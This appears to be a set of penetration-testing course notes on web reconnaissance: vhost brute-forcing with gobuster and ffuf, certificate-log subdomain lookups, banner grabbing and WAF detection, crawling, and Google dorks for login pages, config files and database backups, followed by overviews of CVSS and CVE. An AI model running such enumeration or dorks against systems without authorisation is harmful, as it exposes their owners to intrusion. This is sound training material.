<p>While manual analysis of <code class="language-plaintext highlighter-rouge">HTTP headers</code> and reverse <code class="language-plaintext highlighter-rouge">DNS lookups</code> can be effective, specialised <code class="language-plaintext highlighter-rouge">virtual host discovery tools</code> automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential <code class="language-plaintext highlighter-rouge">virtual hosts</code>.</p>

<p>Several tools are available to aid in the discovery of virtual hosts:</p>

<table>
  <thead>
    <tr>
      <th>Tool</th>
      <th>Description</th>
      <th>Features</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://github.com/OJ/gobuster">gobuster</a></td>
      <td>A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery.</td>
      <td>Fast, supports multiple HTTP methods, can use custom wordlists.</td>
    </tr>
    <tr>
      <td><a href="https://github.com/epi052/feroxbuster">Feroxbuster</a></td>
      <td>Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility.</td>
      <td>Supports recursion, wildcard discovery, and various filters.</td>
    </tr>
    <tr>
      <td><a href="https://github.com/ffuf/ffuf">ffuf</a></td>
      <td>Another fast web fuzzer that can be used for virtual host discovery by fuzzing the <code class="language-plaintext highlighter-rouge">Host</code> header.</td>
      <td>Customizable wordlist input and filtering options.</td>
    </tr>
  </tbody>
</table>

<p>The <code class="language-plaintext highlighter-rouge">gobuster</code> command to bruteforce vhosts generally looks like this:</p>

<p>Virtual Hosts</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>gobuster vhost <span class="nt">-u</span> http://&lt;target_IP_address&gt; <span class="nt">-w</span> &lt;wordlist_file&gt; <span class="nt">--append-domain</span>
</code></pre></div></div>

<ul>
  <li>The <code class="language-plaintext highlighter-rouge">-u</code> flag specifies the target URL (replace <code class="language-plaintext highlighter-rouge">&lt;target_IP_address&gt;</code> with the actual IP).</li>
  <li>The <code class="language-plaintext highlighter-rouge">-w</code> flag specifies the wordlist file (replace <code class="language-plaintext highlighter-rouge">&lt;wordlist_file&gt;</code> with the path to your wordlist).</li>
  <li>
    <p>The <code class="language-plaintext highlighter-rouge">--append-domain</code> flag appends the base domain to each word in the wordlist.</p>

    <p>In newer versions of Gobuster, the –append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery.</p>
  </li>
</ul>

<p>#fuzzing #subdomain #gobuster</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>gobuster vhost <span class="nt">-u</span> http://inlanefreight.htb:81 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">--append-domain</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:             http://inlanefreight.htb:81
<span class="o">[</span>+] Method:          GET
<span class="o">[</span>+] Threads:         10
<span class="o">[</span>+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+] User Agent:      gobuster/3.6
<span class="o">[</span>+] Timeout:         10s
<span class="o">[</span>+] Append Domain:   <span class="nb">true</span>
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Found: forum.inlanefreight.htb:81 Status: 200 <span class="o">[</span>Size: 100]
<span class="o">[</span>...]
Progress: 114441 / 114442 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>#ffuf #subdomain</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> <span class="s1">'http://inlanefreight.htb:57580'</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.inlanefreight.htb:57580'</span> <span class="nt">-w</span> /home/nullbyte/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -fs 116

</code></pre></div></div>

<h1 id="certificate-transparency-logs">Certificate Transparency Logs</h1>

<hr />

<p>In the sprawling mass of the internet, trust is a fragile commodity. One of the cornerstones of this trust is the <code class="language-plaintext highlighter-rouge">Secure Sockets Layer/Transport Layer Security</code> (<code class="language-plaintext highlighter-rouge">SSL/TLS</code>) protocol, which encrypts communication between your browser and a website. At the heart of SSL/TLS lies the <code class="language-plaintext highlighter-rouge">digital certificate</code>, a small file that verifies a website’s identity and allows for secure, encrypted communication.</p>

<p>However, the process of issuing and managing these certificates isn’t foolproof. Attackers can exploit rogue or mis-issued certificates to impersonate legitimate websites, intercept sensitive data, or spread malware. This is where Certificate Transparency (CT) logs come into play.</p>

<p>Certificate Transparency (CT) logs are public, append-only ledgers that record the issuance of SSL/TLS certificates. Whenever a Certificate Authority (CA) issues a new certificate, it must submit it to multiple CT logs. Independent organisations maintain these logs and are open for anyone to inspect.</p>

<p>Think of CT logs as a global registry of certificates. They provide a transparent and verifiable record of every SSL/TLS certificate issued for a website. This transparency serves several crucial purposes:</p>

<h3 id="crtsh-lookup">Crt.sh lookup</h3>

<p>While <code class="language-plaintext highlighter-rouge">crt.sh</code> offers a convenient web interface, you can also leverage its API for automated searches directly from your terminal. Let’s see how to find all ‘dev’ subdomains on <code class="language-plaintext highlighter-rouge">facebook.com</code> using <code class="language-plaintext highlighter-rouge">curl</code> and <code class="language-plaintext highlighter-rouge">jq</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"https://crt.sh/?q=facebook.com&amp;output=json"</span> | jq <span class="nt">-r</span> <span class="s1">'.[] | select(.name_value | contains("dev")) | .name_value'</span> | <span class="nb">sort</span> <span class="nt">-u</span>  
<span class="k">*</span>.dev.facebook.com  
<span class="k">*</span>.newdev.facebook.com  
<span class="k">*</span>.secure.dev.facebook.com  
dev.facebook.com  
devvm1958.ftw3.facebook.com  
facebook-amex-dev.facebook.com  
facebook-amex-sign-enc-dev.facebook.com  
newdev.facebook.com  
secure.dev.facebook.com
</code></pre></div></div>

<hr />

<h2 id="fingerprinting-techniques">Fingerprinting Techniques</h2>

<p>There are several techniques used for web server and technology fingerprinting:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Banner Grabbing</code>: Banner grabbing involves analysing the banners presented by web servers and other services. These banners often reveal the server software, version numbers, and other details.</li>
  <li><code class="language-plaintext highlighter-rouge">Analysing HTTP Headers</code>: HTTP headers transmitted with every web page request and response contain a wealth of information. The <code class="language-plaintext highlighter-rouge">Server</code> header typically discloses the web server software, while the <code class="language-plaintext highlighter-rouge">X-Powered-By</code> header might reveal additional technologies like scripting languages or frameworks.</li>
  <li><code class="language-plaintext highlighter-rouge">Probing for Specific Responses</code>: Sending specially crafted requests to the target can elicit unique responses that reveal specific technologies or versions. For example, certain error messages or behaviours are characteristic of particular web servers or software components.</li>
  <li><code class="language-plaintext highlighter-rouge">Analysing Page Content</code>: A web page’s content, including its structure, scripts, and other elements, can often provide clues about the underlying technologies. There may be a copyright header that indicates specific software being used, for example.</li>
</ul>

<p>A variety of tools exist that automate the fingerprinting process, combining various techniques to identify web servers, operating systems, content management systems, and other technologies:</p>

<p>| Tool         | Description                                                                                                           | Features                                                                                            |
| ———— | ——————————————————————————————————————— | ————————————————————————————————— |
| <code class="language-plaintext highlighter-rouge">Wappalyzer</code> | Browser extension and online service for website technology profiling.                                                | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. |
| <code class="language-plaintext highlighter-rouge">BuiltWith</code>  | Web technology profiler that provides detailed reports on a website’s technology stack.                               | Offers both free and paid plans with varying levels of detail.                                      |
| <code class="language-plaintext highlighter-rouge">WhatWeb</code>    | Command-line tool for website fingerprinting.                                                                         | Uses a vast database of signatures to identify various web technologies.                            |
| <code class="language-plaintext highlighter-rouge">Nmap</code>       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting.                          |
| <code class="language-plaintext highlighter-rouge">Netcraft</code>   | Offers a range of web security services, including website fingerprinting and security reporting.                     | Provides detailed reports on a website’s technology, hosting provider, and security posture.        |
| <code class="language-plaintext highlighter-rouge">wafw00f</code>    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs).                             | Helps determine if a WAF is present and, if so, its type and configuration.                         |</p>
<h3 id="banner-grabbing">Banner Grabbing</h3>

<p>Our first step is to gather information directly from the web server itself. We can do this using the <code class="language-plaintext highlighter-rouge">curl</code> command with the <code class="language-plaintext highlighter-rouge">-I</code> flag (or <code class="language-plaintext highlighter-rouge">--head</code>) to fetch only the HTTP headers, not the entire page content.</p>

<p>Fingerprinting</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>curl <span class="nt">-I</span> inlanefreight.com


HTTP/1.1 301 Moved Permanently
Date: Fri, 31 May 2024 12:07:44 GMT
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Location: https://inlanefreight.com/
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</code></pre></div></div>

<h3 id="wafw00f">Wafw00f</h3>

<p><code class="language-plaintext highlighter-rouge">Web Application Firewalls</code> (<code class="language-plaintext highlighter-rouge">WAFs</code>) are security solutions designed to protect web applications from various attacks. Before proceeding with further fingerprinting, it’s crucial to determine if <code class="language-plaintext highlighter-rouge">inlanefreight.com</code> employs a WAF, as it could interfere with our probes or potentially block our requests.</p>

<p>To detect the presence of a WAF, we’ll use the <code class="language-plaintext highlighter-rouge">wafw00f</code> tool. To install <code class="language-plaintext highlighter-rouge">wafw00f</code>, you can use pip3:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>pip3 <span class="nb">install </span>git+https://github.com/EnableSecurity/wafw00f
</code></pre></div></div>

<h1 id="crawling">Crawling</h1>

<p><code class="language-plaintext highlighter-rouge">Crawling</code>, often called <code class="language-plaintext highlighter-rouge">spidering</code>, is the <code class="language-plaintext highlighter-rouge">automated process of systematically browsing the World Wide Web</code>. Similar to how a spider navigates its web, a web crawler follows links from one page to another, collecting information. These crawlers are essentially bots that use pre-defined algorithms to discover and index web pages, making them accessible through search engines or for other purposes like data analysis and web reconnaissance.</p>

<h2 id="how-web-crawlers-work">How Web Crawlers Work</h2>

<p>The basic operation of a web crawler is straightforward yet powerful. It starts with a seed URL, which is the initial web page to crawl. The crawler fetches this page, parses its content, and extracts all its links. It then adds these links to a queue and crawls them, repeating the process iteratively. Depending on its scope and configuration, the crawler can explore an entire website or even a vast portion of the web.</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Homepage</code>: You start with the homepage containing <code class="language-plaintext highlighter-rouge">link1</code>, <code class="language-plaintext highlighter-rouge">link2</code>, and <code class="language-plaintext highlighter-rouge">link3</code>.</li>
</ol>

<hr />

<h1 id="robotstxt">robots.txt</h1>

<p>Imagine you’re a guest at a grand house party. While you’re free to mingle and explore, there might be certain rooms marked “Private” that you’re expected to avoid. This is akin to how <code class="language-plaintext highlighter-rouge">robots.txt</code> functions in the world of web crawling. It acts as a virtual “<code class="language-plaintext highlighter-rouge">etiquette guide</code>” for bots, outlining which areas of a website they are allowed to access and which are off-limits.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
User-agent: <span class="k">*</span>
Disallow: /private/

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: <span class="k">*</span>
Disallow: /admin/
Disallow: /private/
Allow: /public/

User-agent: Googlebot
Crawl-delay: 10

Sitemap: https://www.example.com/sitemap.xml
</code></pre></div></div>

<p>This file contains the following directives:</p>

<ul>
  <li>All user agents are disallowed from accessing the <code class="language-plaintext highlighter-rouge">/admin/</code> and <code class="language-plaintext highlighter-rouge">/private/</code> directories.</li>
  <li>All user agents are allowed to access the <code class="language-plaintext highlighter-rouge">/public/</code> directory.</li>
  <li>The <code class="language-plaintext highlighter-rouge">Googlebot</code> (Google’s web crawler) is specifically instructed to wait 10 seconds between requests.</li>
  <li>The sitemap, located at <code class="language-plaintext highlighter-rouge">https://www.example.com/sitemap.xml</code>, is provided for easier crawling and indexing.</li>
</ul>

<p>By analyzing this robots.txt, we can infer that the website likely has an admin panel located at <code class="language-plaintext highlighter-rouge">/admin/</code> and some private content in the <code class="language-plaintext highlighter-rouge">/private/</code> directory.</p>

<hr />
<h1 id="well-known-uris">Well-Known URIs</h1>

<p>The <code class="language-plaintext highlighter-rouge">.well-known</code> standard, defined in <a href="https://datatracker.ietf.org/doc/html/rfc8615">RFC 8615</a>, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the <code class="language-plaintext highlighter-rouge">/.well-known/</code> path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>

<p>By establishing a consistent location for such data, <code class="language-plaintext highlighter-rouge">.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request <code class="language-plaintext highlighter-rouge">https://example.com/.well-known/security.txt</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">Internet Assigned Numbers Authority</code> (<code class="language-plaintext highlighter-rouge">IANA</code>) maintains a <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">registry</a> of <code class="language-plaintext highlighter-rouge">.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards. Below is a table highlighting a few notable examples:</p>

<table>
  <thead>
    <tr>
      <th>URI Suffix</th>
      <th>Description</th>
      <th>Status</th>
      <th>Reference</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">security.txt</code></td>
      <td>Contains contact information for security researchers to report vulnerabilities.</td>
      <td>Permanent</td>
      <td>RFC 9116</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">/.well-known/change-password</code></td>
      <td>Provides a standard URL for directing users to a password change page.</td>
      <td>Provisional</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">openid-configuration</code></td>
      <td>Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.</td>
      <td>Permanent</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">assetlinks.json</code></td>
      <td>Used for verifying ownership of digital assets (e.g., apps) associated with a domain.</td>
      <td>Permanent</td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">mta-sts.txt</code></td>
      <td>Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.</td>
      <td>Permanent</td>
      <td>RFC 8461</td>
    </tr>
  </tbody>
</table>

<hr />

<h1 id="creepy-crawlies">Creepy Crawlies</h1>

<p>Web crawling is vast and intricate, but you don’t have to embark on this journey alone. A plethora of web crawling tools are available to assist you, each with its own strengths and specialties. These tools automate the crawling process, making it faster and more efficient, allowing you to focus on analyzing the extracted data.</p>

<h2 id="popular-web-crawlers">Popular Web Crawlers</h2>

<ol>
  <li><code class="language-plaintext highlighter-rouge">Burp Suite Spider</code>: Burp Suite, a widely used web application testing platform, includes a powerful active crawler called Spider.</li>
  <li><code class="language-plaintext highlighter-rouge">OWASP ZAP (Zed Attack Proxy)</code>: ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities.</li>
  <li><code class="language-plaintext highlighter-rouge">Scrapy (Python Framework)</code>: Scrapy is a versatile and scalable Python framework for building custom web crawlers.</li>
  <li><code class="language-plaintext highlighter-rouge">Apache Nutch (Scalable Crawler)</code>: Nutch is a highly extensible and scalable open-source web crawler written in Java. It’s designed to handle massive crawls across the entire web or focus on specific domains.</li>
</ol>

<p>Adhering to ethical and responsible crawling practices is crucial no matter which tool you choose. Always obtain permission before crawling a website, especially if you plan to perform extensive or intrusive scans. Be mindful of the website’s server resources and avoid overloading them with excessive requests.</p>

<hr />

<h1 id="search-engine-discovery">Search Engine Discovery</h1>

<p>Search engines serve as our guides in the vast landscape of the internet, helping us navigate through the seemingly endless expanse of information. However, beyond their primary function of answering everyday queries, search engines also hold a treasure trove of data that can be invaluable for web reconnaissance and information gathering. This practice, known as search engine discovery or OSINT (Open Source Intelligence) gathering, involves using search engines as powerful tools to uncover information about target websites, organisations, and individuals.</p>

<h2 id="search-operators">Search Operators</h2>

<p>Search operators are like search engines’ secret codes. These special commands and modifiers unlock a new level of precision and control, allowing you to pinpoint specific types of information amidst the vastness of the indexed web.</p>

<p>While the exact syntax may vary slightly between search engines, the underlying principles remain consistent. Let’s delve into some essential and advanced search operators:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Operator</th>
      <th style="text-align: left">Operator Description</th>
      <th style="text-align: left">Example</th>
      <th style="text-align: left">Example Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:</code></td>
      <td style="text-align: left">Limits results to a specific website or domain.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:example.com</code></td>
      <td style="text-align: left">Find all publicly accessible pages on example.com.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">inurl:</code></td>
      <td style="text-align: left">Finds pages with a specific term in the URL.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">inurl:login</code></td>
      <td style="text-align: left">Search for login pages on any website.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">filetype:</code></td>
      <td style="text-align: left">Searches for files of a particular type.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">filetype:pdf</code></td>
      <td style="text-align: left">Find downloadable PDF documents.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">intitle:</code></td>
      <td style="text-align: left">Finds pages with a specific term in the title.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">intitle:"confidential report"</code></td>
      <td style="text-align: left">Look for documents titled “confidential report” or similar variations.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">intext:</code> or <code class="language-plaintext highlighter-rouge">inbody:</code></td>
      <td style="text-align: left">Searches for a term within the body text of pages.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">intext:"password reset"</code></td>
      <td style="text-align: left">Identify webpages containing the term “password reset”.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cache:</code></td>
      <td style="text-align: left">Displays the cached version of a webpage (if available).</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">cache:example.com</code></td>
      <td style="text-align: left">View the cached version of example.com to see its previous content.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">link:</code></td>
      <td style="text-align: left">Finds pages that link to a specific webpage.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">link:example.com</code></td>
      <td style="text-align: left">Identify websites linking to example.com.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">related:</code></td>
      <td style="text-align: left">Finds websites related to a specific webpage.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">related:example.com</code></td>
      <td style="text-align: left">Discover websites similar to example.com.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">info:</code></td>
      <td style="text-align: left">Provides a summary of information about a webpage.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">info:example.com</code></td>
      <td style="text-align: left">Get basic details about example.com, such as its title and description.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">define:</code></td>
      <td style="text-align: left">Provides definitions of a word or phrase.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">define:phishing</code></td>
      <td style="text-align: left">Get a definition of “phishing” from various sources.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">numrange:</code></td>
      <td style="text-align: left">Searches for numbers within a specific range.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:example.com numrange:1000-2000</code></td>
      <td style="text-align: left">Find pages on example.com containing numbers between 1000 and 2000.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allintext:</code></td>
      <td style="text-align: left">Finds pages containing all specified words in the body text.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allintext:admin password reset</code></td>
      <td style="text-align: left">Search for pages containing both “admin” and “password reset” in the body text.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allinurl:</code></td>
      <td style="text-align: left">Finds pages containing all specified words in the URL.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allinurl:admin panel</code></td>
      <td style="text-align: left">Look for pages with “admin” and “panel” in the URL.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allintitle:</code></td>
      <td style="text-align: left">Finds pages containing all specified words in the title.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">allintitle:confidential report 2023</code></td>
      <td style="text-align: left">Search for pages with “confidential,” “report,” and “2023” in the title.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">AND</code></td>
      <td style="text-align: left">Narrows results by requiring all terms to be present.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:example.com AND (inurl:admin OR inurl:login)</code></td>
      <td style="text-align: left">Find admin or login pages specifically on example.com.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">OR</code></td>
      <td style="text-align: left">Broadens results by including pages with any of the terms.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">"linux" OR "ubuntu" OR "debian"</code></td>
      <td style="text-align: left">Search for webpages mentioning Linux, Ubuntu, or Debian.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">NOT</code></td>
      <td style="text-align: left">Excludes results containing the specified term.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:bank.com NOT inurl:login</code></td>
      <td style="text-align: left">Find pages on bank.com excluding login pages.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">*</code> (wildcard)</td>
      <td style="text-align: left">Represents any character or word.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:socialnetwork.com filetype:pdf user* manual</code></td>
      <td style="text-align: left">Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">..</code> (range search)</td>
      <td style="text-align: left">Finds results within a specified numerical range.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:ecommerce.com "price" 100..500</code></td>
      <td style="text-align: left">Look for products priced between 100 and 500 on an e-commerce website.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">" "</code> (quotation marks)</td>
      <td style="text-align: left">Searches for exact phrases.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">"information security policy"</code></td>
      <td style="text-align: left">Find documents mentioning the exact phrase “information security policy”.</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-</code> (minus sign)</td>
      <td style="text-align: left">Excludes terms from the search results.</td>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">site:news.com -inurl:sports</code></td>
      <td style="text-align: left">Search for news articles on news.com excluding sports-related content.</td>
    </tr>
  </tbody>
</table>

<h3 id="google-dorking">Google Dorking</h3>

<p>Google Dorking, also known as Google Hacking, is a technique that leverages the power of search operators to uncover sensitive information, security vulnerabilities, or hidden content on websites, using Google Search.</p>

<p>Here are some common examples of Google Dorks, for more examples, refer to the <a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a>:</p>

<ul>
  <li>Finding Login Pages:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">site:example.com inurl:login</code></li>
      <li><code class="language-plaintext highlighter-rouge">site:example.com (inurl:login OR inurl:admin)</code></li>
    </ul>
  </li>
  <li>Identifying Exposed Files:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">site:example.com filetype:pdf</code></li>
      <li><code class="language-plaintext highlighter-rouge">site:example.com (filetype:xls OR filetype:docx)</code></li>
    </ul>
  </li>
  <li>Uncovering Configuration Files:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">site:example.com inurl:config.php</code></li>
      <li><code class="language-plaintext highlighter-rouge">site:example.com (ext:conf OR ext:cnf)</code> (searches for extensions commonly used for configuration files)</li>
    </ul>
  </li>
  <li>Locating Database Backups:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">site:example.com inurl:backup</code></li>
      <li><code class="language-plaintext highlighter-rouge">site:example.com filetype:sql</code></li>
    </ul>
  </li>
</ul>

<h1 id="web-archives">Web Archives</h1>

<hr />

<p>In the fast-paced digital world, websites come and go, leaving only fleeting traces of their existence behind. However, thanks to the <a href="https://web.archive.org/">Internet Archive’s Wayback Machine</a>, we have a unique opportunity to revisit the past and explore the digital footprints of websites as they once were.</p>

<p><code class="language-plaintext highlighter-rouge">The Wayback Machine</code> is a digital archive of the World Wide Web and other information on the Internet. Founded by the Internet Archive, a non-profit organization, it has been archiving websites since 1996.</p>

<h2 id="going-wayback-on-htb">Going Wayback on HTB</h2>

<p>We can view the first archived version of HackTheBox by entering the page we are looking for into the Wayback Machine and selecting the earliest available capture date, being <code class="language-plaintext highlighter-rouge">2017-06-10 @ 04h23:01</code></p>

<p>https://web.archive.org/</p>

<hr />

<h1 id="common-vulnerability-scoring-system-cvss">Common Vulnerability Scoring System (CVSS)</h1>

<p>There are various ways to score or calculate severity ratings of vulnerabilities. The <a href="https://www.first.org/cvss/">Common Vulnerability Scoring System (CVSS)</a> is an industry standard for performing these calculations. Many scanning tools will apply these scores to each finding as a part of the scan results, but it’s important that we understand how these scores are derived in case we ever need to calculate one by hand or justify the score applied to a given vulnerability. The CVSS is often used together with the so-called <a href="https://en.wikipedia.org/wiki/DREAD_\(risk_assessment_model\)">Microsoft DREAD</a>. <code class="language-plaintext highlighter-rouge">DREAD</code> is a risk assessment system developed by Microsoft to help IT security professionals evaluate the severity of security threats and vulnerabilities. It is used to perform a risk analysis by using a scale of 10 points to assess the severity of security threats and vulnerabilities. With this, we calculate the risk of a threat or vulnerability based on five main factors:</p>

<ul>
  <li>Damage Potential</li>
  <li>Reproducibility</li>
  <li>Exploitability</li>
  <li>Affected Users</li>
  <li>Discoverability</li>
</ul>

<p>The model is essential to Microsoft’s security strategy and is used to monitor, assess and respond to security threats and vulnerabilities in Microsoft products. It also serves as a reference for IT security professionals and managers to perform their risk assessment and prioritization of security threats and vulnerabilities.</p>

<h2 id="calculating-cvss-severity">Calculating CVSS Severity</h2>

<p>The calculation of a CVSS v3.1 score takes into account all the metrics discussed in this section. The National Vulnerability Database has a calculator available to the public <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">here</a>.</p>

<h1 id="common-vulnerabilities-and-exposures-cve">Common Vulnerabilities and Exposures (CVE)</h1>

<h2 id="open-vulnerability-assessment-language-oval">Open Vulnerability Assessment Language (OVAL)</h2>

<p><a href="https://oval.mitre.org/">Open Vulnerability Assessment Language (OVAL)</a> is a publicly available information security international standard used to evaluate and detail the system’s current state and issues. OVAL is also co-supported by the office of Cybersecurity and Communications from the U.S. Department of Homeland Security. OVAL provides a language to understand encoding system attributes and various content repositories shared within the security community. The OVAL repository has over 7000+ definitions for public use. Additionally, OVAL is also used by the U.S. National Institute of Standards and Technology’s (NIST) Security Content Automation Protocol (SCAP) which brings together community ideas for automating vulnerability management, measurement, and ensuring systems meet policy compliance.</p>

<h1 id="cve">CVE</h1>
<p><a href="https://cve.mitre.org/">Common Vulnerabilities and Exposures (CVE)</a> is a publicly available catalog of security issues sponsored by the United States Department of Homeland Security (DHS). Each security issue has a unique CVE ID number assigned by the CVE Numbering Authority (CNA). The purpose of creating a unique CVE ID number is to create a standardization for a vulnerability or exposure as a researcher identifies it. A CVE consists of critical information regarding a vulnerability or exposure, including a description and references about the issue. The information in a CVE allows an organization’s IT team to understand how detrimental a problem could be to their environment.</p>

<p>The following chart explains how a CVE ID may be assigned to a vulnerability. Any vulnerabilities assigned a CVE must be independently fixable, affect just one codebase, and be acknowledged and documented by the relevant vendor.</p>

<h4 id="stage-1-identify-if-cve-is-required-and-relevant">Stage 1: Identify if CVE is Required and Relevant</h4>

<p>Identify if the issue found is a vulnerability. According to the CVE Team, “A vulnerability in the context of the CVE Program is indicated by code that can be exploited, resulting in a negative impact to confidentiality, integrity, OR availability, and that requires a coding change, specification change, or specification deprecation to mitigate or address.” Additionally, research should verify there is not a CVE ID already in the CVE database.</p>

<h4 id="stage-2-reach-out-to-affected-product-vendor">Stage 2: Reach Out to Affected Product Vendor</h4>

<p>A researcher should ensure they have made a good faith effort to contact a vendor directly. Researchers can reference CVE’s <a href="https://cve.mitre.org/cve/researcher_reservation_guidelines#appendix#a">Documents on Disclosure Practices</a> for additional information.</p>

<h4 id="stage-3-identify-if-request-should-be-for-vendor-cna-or-third-party-cna">Stage 3: Identify if Request Should Be For Vendor CNA or Third Party CNA</h4>

